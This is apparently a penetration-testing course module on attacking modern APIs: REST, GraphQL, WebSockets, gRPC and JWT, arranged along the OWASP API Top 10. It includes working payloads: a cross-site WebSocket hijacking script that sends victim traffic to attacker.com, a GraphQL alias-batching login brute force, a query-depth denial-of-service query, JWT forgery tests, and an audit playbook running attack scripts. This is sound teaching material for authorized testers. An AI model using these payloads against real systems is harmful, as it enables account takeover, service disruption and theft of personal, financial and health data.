# Module 15 · Modern API Attacks

The 2010s were the decade of "the API economy." The 2020s have been the decade of "your API surface is now larger than your web surface." Modern apps expose REST endpoints, GraphQL schemas, WebSocket channels, gRPC services, and mobile-only APIs simultaneously — and the auth and authz logic across them is rarely uniform.

OWASP maintains a separate **API Security Top 10** ([2023 edition](https://owasp.org/API-Security/editions/2023/en/0x11-t10/)) precisely because the failure modes are different from the web Top 10. This module walks each top issue with attacker tooling.

## OWASP API Security Top 10 (2023) at a glance

| # | Title | Short |
|---|---|---|
| API1 | **Broken Object Level Authorization (BOLA)** | IDOR, the API edition |
| API2 | **Broken Authentication** | JWT issues, session handling |
| API3 | **Broken Object Property Level Authorization** | Mass assignment + excessive data exposure |
| API4 | **Unrestricted Resource Consumption** | Rate limit failures, money/CPU bombs |
| API5 | **Broken Function Level Authorization** | Vertical privesc on admin endpoints |
| API6 | **Unrestricted Access to Sensitive Business Flows** | E.g. unlimited coupon use |
| API7 | **Server Side Request Forgery (SSRF)** | Same as web tier |
| API8 | **Security Misconfiguration** | CORS, default creds, debug endpoints |
| API9 | **Improper Inventory Management** | Old API versions still live, shadow APIs |
| API10 | **Unsafe Consumption of APIs** | Trusting third-party APIs without validation |

## 1. REST APIs — what's different from the web tier

REST endpoints have predictable shapes:

```
GET    /api/v1/users           # list
GET    /api/v1/users/{id}      # read
POST   /api/v1/users           # create
PUT    /api/v1/users/{id}      # full update
PATCH  /api/v1/users/{id}      # partial update
DELETE /api/v1/users/{id}      # delete
```

That predictability is your friend. **Once you find one resource, you know the URL pattern for all of them.** Always check whether a JSON response embedding `{"id": 12345}` corresponds to `/api/v1/<resource>/12345`.

### API discovery

Sources for the endpoint inventory:

| Source | How to use |
|---|---|
| Swagger / OpenAPI spec | `/swagger.json`, `/openapi.json`, `/api-docs`, `/v2/api-docs` |
| GraphQL introspection | `__schema` query (see below) |
| JS bundle source | grep for `'/api/'`, `fetch(`, `axios.`, `\.post(`, `\.get(` |
| `.well-known` paths | `/.well-known/openid-configuration`, `/.well-known/oauth-authorization-server` |
| Postman collection links | `app.getpostman.com` URLs sometimes leaked in Slack/GitHub |
| Mobile app reverse engineering | APK/IPA → strings → hardcoded API URLs |
| Subdomain enumeration | `api.example.com`, `api-internal.example.com`, `api-v2.example.com` (Part 3) |

Our **`openapi_attacker.py`** consumes a Swagger/OpenAPI spec and auto-generates auth, BOLA, and mass-assignment probes for every endpoint.

### Versioning and shadow APIs (API9)

Old API versions are rarely retired cleanly. Common findings:

```
GET /api/v1/users/123    → blocked (returns 410 Gone)
GET /api/v2/users/123    → current production
GET /api/internal/users  → was supposed to be internal-only
GET /api/beta/users      → still listening, never authenticated
GET /apiv1/users/123     → typo route, never patched
```

Always check **multiple version paths and prefixes** when you find one. Our `web/openapi_attacker.py` includes a "version sweep" mode.

### Rate limiting and resource consumption (API4 + API6)

Specific things to test:
- Endpoint accepts a `limit=N` parameter — try `limit=1000000`
- Endpoint accepts a `page_size` parameter — try the same
- Search endpoint with `*` or `%` wildcards
- File upload with no size limit
- Resize/transform endpoints — pass attacker-chosen dimensions (zip-bomb-class)
- Email-sending endpoints with no rate limit (spam vector + cost bomb if SES-billed)
- Coupon/voucher application with no per-account/per-coupon limit

Our **`api_idor_fuzzer.py`** has a `--rate-test` mode to flag endpoints that lack rate limiting.

## 2. GraphQL — the introspection bonanza

GraphQL is a query language that, by default, lets clients ask "what queries are available?" via the introspection query:

```graphql
query IntrospectionQuery {
  __schema {
    types {
      name
      fields {
        name
        type { name kind ofType { name kind } }
      }
    }
    queryType { name }
    mutationType { name }
  }
}
```

This is the equivalent of getting a full Swagger spec for free. Our **`graphql_introspect.py`** runs this query and outputs:
- A type map (objects, enums, scalars)
- Every Query field with arguments
- Every Mutation field with arguments
- A list of "interesting" types (types with `password`, `token`, `secret`, `apiKey` fields, etc.)

### GraphQL-specific attacks

**Batching and aliasing.** GraphQL allows multiple operations per request via aliases:

```graphql
query Brute {
  a1: login(user: "admin", password: "p1") { token }
  a2: login(user: "admin", password: "p2") { token }
  a3: login(user: "admin", password: "p3") { token }
  ...
  a1000: login(user: "admin", password: "p1000") { token }
}
```

Most rate limiters count *requests*, not *operations*. So a single request can do 1000 login attempts. **`graphql_attacks.py`** automates this against any `login`-shaped mutation.

**Field suggestions.** When a field is queried by a not-quite-correct name, many GraphQL servers reply "did you mean X?":

```
{ "errors": [{"message": "Cannot query field 'usrs' on type 'Query'. Did you mean 'users'?"}] }
```

This means even with introspection disabled, you can reverse-engineer the schema by typoing every plausible field name. `graphql_attacks.py` has a `--suggest-mode` for this.

**Query depth / amplification DoS.** Cyclic types let an attacker request exponential data:

```graphql
{ user { friends { friends { friends { friends { name } } } } } }
```

500-deep queries collapse most servers without depth limits.

**Mutation by name.** GraphQL servers sometimes hide mutations from introspection but accept them at runtime. Try `__schema { mutationType { fields { name } } }` AND try plausible mutation names directly.

**Authorization at field level.** Many GraphQL APIs have authorization at the type level but not the field level — so `Query.user` is protected but `User.email` isn't, and you can leak email via:

```graphql
query { someUnprotectedField { user { email } } }
```

## 3. WebSockets — the protocol auditors forget

WebSocket authentication and authz checks are notoriously weak. Common pattern: HTTP auth at the upgrade handshake, then no per-message authorization.

**Audit checklist:**
1. Capture the upgrade request (`GET /ws HTTP/1.1` + `Upgrade: websocket`)
2. Note auth (cookie, header, query param)
3. Try the upgrade with no auth → does it succeed?
4. Try the upgrade with another user's auth → does message routing leak?
5. Send messages with operations the user shouldn't have (admin-only, other-user-targeting)
6. Look for the message format — JSON-RPC, custom JSON, MessagePack, protobuf — and fuzz fields
7. Check Origin enforcement (CSWSH — Cross-Site WebSocket Hijacking)

CSWSH (Cross-Site WebSocket Hijacking):
```html
<!-- on attacker.com, victim authenticates with target.com -->
<script>
  const ws = new WebSocket('wss://target.com/ws');  // browser sends cookies
  ws.onmessage = e => fetch('//attacker.com/exfil', {method: 'POST', body: e.data});
</script>
```

If `target.com/ws` doesn't validate `Origin:`, this exfiltrates the victim's WebSocket traffic.

Our **`websocket_fuzzer.py`** runs the upgrade audit, message format probes, and CSWSH detection.

## 4. gRPC and binary APIs

gRPC over HTTP/2 with protobuf. Auditing is non-trivial because:
- Messages are binary
- Schemas live in `.proto` files often unavailable
- Tools like Burp don't render them natively

Workflow:
1. Find the `.proto` (sometimes embedded in client builds, sometimes in GitHub)
2. Use `grpcurl` with the proto to make readable requests
3. Test for the same auth/authz issues as REST: BOLA, BFLA, mass assignment

If you have no `.proto`, **server reflection** sometimes works:
```
grpcurl -plaintext target:443 list
```

This is the gRPC equivalent of GraphQL introspection. Frequently enabled by accident.

## 5. JWT and bearer-token APIs

The token-handling layer of API security has its own failure modes (separate from auth flow design, which is Module 17):

| Issue | Test |
|---|---|
| `alg=none` accepted | Send `eyJhbGciOiJub25lIn0.{...}.` (empty signature) |
| RSA→HMAC confusion | Take the public key, sign HS256 with it |
| Weak HS256 secret | Brute-force with wordlist (`jwt_tool.py` from Module 07) |
| `kid` parameter injection | SQLi or path traversal in `kid` |
| `jku`/`x5u` to attacker URL | Token specifies attacker URL for verification key |
| Expired tokens still accepted | Send token with `exp` in past |
| Audience mismatch | Token issued for service A used at service B |
| Issuer trust extension | Token from `https://acme.com.evil.com` accepted |

Our **`jwt_api_tester.py`** wraps `jwt_tool.py` (Module 07) for full API workflows.

## 6. The 30-minute API audit playbook

Given a fresh target with API endpoints:

```bash
# 1. Pull the OpenAPI spec if available
curl -s https://api.acme.com/openapi.json > spec.json

# 2. Auto-attack from spec
python3 -m redshift_toolkit.web.openapi_attacker --spec spec.json \
    --base https://api.acme.com --token-a $TOKA --token-b $TOKB

# 3. GraphQL introspection (if applicable)
python3 -m redshift_toolkit.web.graphql_introspect \
    --url https://api.acme.com/graphql --output schema.json

# 4. GraphQL-specific attacks
python3 -m redshift_toolkit.web.graphql_attacks \
    --url https://api.acme.com/graphql --schema schema.json

# 5. WebSocket audit (if applicable)
python3 -m redshift_toolkit.web.websocket_fuzzer \
    --url wss://api.acme.com/ws --auth "$TOKA"

# 6. JWT-specific tests
python3 -m redshift_toolkit.web.jwt_api_tester \
    --token "$TOKA" --endpoint https://api.acme.com/api/me
```

## 7. Industry-specific framings

### Financial services

The **wire-transfer state machine** is the highest-value attack surface. Look for:
- Race conditions in beneficiary changes
- Mass assignment of `status: "approved"`
- Old API version (`/api/v1/transfer`) bypassing 2FA that `/v3/` enforces

### Healthcare

The **HL7 / FHIR APIs** that interconnect patient portals, EHRs, and labs are heavily IDOR-prone. Look for:
- Patient ID in URL → trivially incremented
- "Practitioner" role sometimes inherited from session, sometimes from request payload (mass assignment)
- Bulk export endpoints (FHIR `$export` operation) often unauthenticated

### Government

**SAML / OAuth federations** between agencies. The trust relationships are often loose — find an unverified `iss` claim or `audience` and you've moved laterally between agencies.

### SaaS / Enterprise

**Multi-tenancy isolation breaks** are the catastrophic finding. Test by:
- Creating two trial accounts
- Accessing `/api/orgs/{otherOrgId}/...` from the first
- Embedding `tenant_id` in JWT — try changing it to another org's

## 8. Recap

You should now be able to:

- Discover API endpoints from OpenAPI specs, JS bundles, mobile apps, and GraphQL introspection
- Run BOLA, BFLA, mass assignment, and rate-limit tests against any REST endpoint
- Dump a GraphQL schema, find sensitive types, and execute batching/alias attacks
- Audit WebSocket auth and detect CSWSH
- Frame API findings for fintech, healthcare, gov, and SaaS clients

Tools shipped with this module:

| Script | Purpose |
|---|---|
| `redshift_toolkit.web.graphql_introspect` | GraphQL schema dumper + sensitive-type flagging |
| `redshift_toolkit.web.graphql_attacks` | Batch / alias overloading / suggestion-mode reverse engineering |
| `redshift_toolkit.web.api_idor_fuzzer` | IDOR / BOLA / mass assignment / rate-limit detection |
| `redshift_toolkit.web.openapi_attacker` | Auto-attack from OpenAPI/Swagger spec |
| `redshift_toolkit.web.websocket_fuzzer` | WebSocket auth + CSWSH probe |
| `redshift_toolkit.web.jwt_api_tester` | JWT-specific attacks in API workflow |
| `scripts/part-04/15-api-attacks/api_attacker.py` | Module 15 orchestrator |

→ Next: [Module 16 · Advanced Web Attacks](16-advanced-web.md).
